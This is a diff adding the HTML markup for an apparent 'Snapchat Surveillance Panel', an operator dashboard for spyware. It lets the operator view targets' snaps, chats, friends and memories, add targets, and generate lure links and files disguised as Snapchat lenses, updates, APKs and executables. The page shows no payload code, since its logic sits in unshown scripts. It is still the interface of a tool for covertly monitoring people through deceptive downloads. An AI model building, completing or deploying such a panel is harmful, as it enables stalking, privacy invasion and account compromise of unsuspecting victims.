@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Snapchat Surveillance Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- PWA -->
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#0f172a">
+    <link rel="icon" type="image/png" sizes="192x192" href="icons/icon-192.png">
+    <link rel="apple-touch-icon" href="icons/icon-192.png">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="SOC Console">
+</head>
+<body>
+    <div class="dashboard-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2><i class="fab fa-snapchat"></i> Snapchat Panel</h2>
+                <a href="dashboard.html" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Dashboard
+                </a>
+            </div>
+            
+            <div class="sidebar-menu">
+                <div class="menu-section">
+                    <h3><i class="fas fa-eye"></i> Monitoring</h3>
+                    <a href="#" class="menu-item active" data-tab="snaps">
+                        <i class="fas fa-camera"></i> Snaps & Stories
+                    </a>
+                    <a href="#" class="menu-item" data-tab="chats">
+                        <i class="fas fa-comments"></i> Chat
+                    </a>
+                    <a href="#" class="menu-item" data-tab="friends">
+                        <i class="fas fa-user-friends"></i> Friends
+                    </a>
+                    <a href="#" class="menu-item" data-tab="memories">
+                        <i class="fas fa-images"></i> Memories
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-cogs"></i> Tools</h3>
+                    <a href="#" class="menu-item" id="sc-generate-link">
+                        <i class="fas fa-link"></i> Generate Link
+                    </a>
+                    <a href="#" class="menu-item" id="sc-generate-file">
+                        <i class="fas fa-file-download"></i> Generate File
+                    </a>
+                    <a href="#" class="menu-item" data-tab="settings">
+                        <i class="fas fa-sliders-h"></i> Settings
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-users"></i> Targets</h3>
+                    <div class="targets-list" id="sc-targets-list">
+                        <!-- Targets will be loaded here -->
+                    </div>
+                </div>
+            </div>
+            
+            <div class="sidebar-footer">
+                <div class="connection-status">
+                    <i class="fas fa-circle status-online"></i>
+                    <span>Connected: <strong id="sc-connected-targets">3</strong> targets</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="content-header">
+                <h1><i class="fab fa-snapchat"></i> Snapchat Surveillance</h1>
+                <div class="header-actions">
+                    <button class="btn-refresh" id="sc-refresh">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                    <button class="btn-add-target" id="sc-add-target">
+                        <i class="fas fa-plus"></i> Add Target
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Tab Content -->
+            <div class="tab-content active" id="snaps-tab">
+                <div class="snapchat-container">
+                    <div class="stories-section">
+                        <h3><i class="fas fa-history"></i> Recent Stories</h3>
+                        <div class="snap-stories" id="sc-stories">
+                            <!-- Snapchat stories will be loaded here -->
+                        </div>
+                    </div>
+                    
+                    <div class="snaps-section">
+                        <h3><i class="fas fa-camera"></i> Recent Snaps</h3>
+                        <div class="snaps-grid" id="sc-snaps">
+                            <!-- Snaps will be loaded here -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Generated Items Panel -->
+            <div class="generated-panel">
+                <h3><i class="fas fa-code"></i> Generated Items</h3>
+                <div class="generated-items-list" id="sc-generated-items">
+                    <!-- Generated Snapchat items -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Snapchat Link Generator Modal -->
+    <div class="modal" id="sc-link-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fab fa-snapchat"></i> Generate Snapchat Link</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>Link Type</label>
+                    <select id="sc-link-type">
+                        <option value="filter">New Filter</option>
+                        <option value="lens">AR Lens</option>
+                        <option value="update">App Update</option>
+                        <option value="tool">Snapchat Tool</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Target Device</label>
+                    <select id="sc-target-device">
+                        <option value="android">Android</option>
+                        <option value="ios">iPhone</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Link Name</label>
+                    <input type="text" id="sc-link-name" placeholder="Snapchat AR Lens" value="New Snapchat AR Lens Pack">
+                </div>
+                <div class="form-actions">
+                    <button class="btn-generate" id="sc-generate-link-btn">
+                        <i class="fas fa-bolt"></i> Generate Link
+                    </button>
+                    <button class="btn-copy" id="sc-copy-link">
+                        <i class="fas fa-copy"></i> Copy Link
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Snapchat File Generator Modal -->
+    <div class="modal" id="sc-file-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fab fa-snapchat"></i> Generate Snapchat File</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>File Type</label>
+                    <select id="sc-file-type">
+                        <option value="apk">Snapchat Plus APK</option>
+                        <option value="zip">Filter Pack</option>
+                        <option value="exe">Snapchat Tools</option>
+                        <option value="pdf">User Guide</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>File Name</label>
+                    <input type="text" id="sc-file-name" placeholder="Snapchat_Plus.apk" value="Snapchat_Filter_Pack.zip">
+                </div>
+                <div class="form-group">
+                    <label>File Size (MB)</label>
+                    <input type="range" id="sc-file-size" min="1" max="100" value="120">
+                    <span id="sc-size-value">120 MB</span>
+                </div>
+                <div class="form-actions">
+                    <button class="btn-generate" id="sc-generate-file-btn">
+                        <i class="fas fa-bolt"></i> Generate File
+                    </button>
+                    <button class="btn-download" id="sc-download-file">
+                        <i class="fas fa-download"></i> Download File
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="platform.js"></script>
+    <script src="modules.js"></script>
+    <script>
+        // Snapchat specific initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeSnapchatPanel();
+        });
+    </script>
+    <script src="pwa.js"></script>
+</body>
+</html>
